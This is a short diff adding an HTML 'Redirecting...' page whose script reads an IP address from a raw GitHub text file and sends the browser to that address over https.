@@ -1,0 +1,8 @@
+<h1>Redirecting...</h1>
+  <script>
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://raw.githubusercontent.com/FREE-TECH-SUPPORT/IP-ADDRESS/main/ipaddress.txt", false ); // false for synchronous request
+    xmlHttp.send( null );
+    var out = "https://"+xmlHttp.responseText;
+    window.open(out, "_self");
+</script>
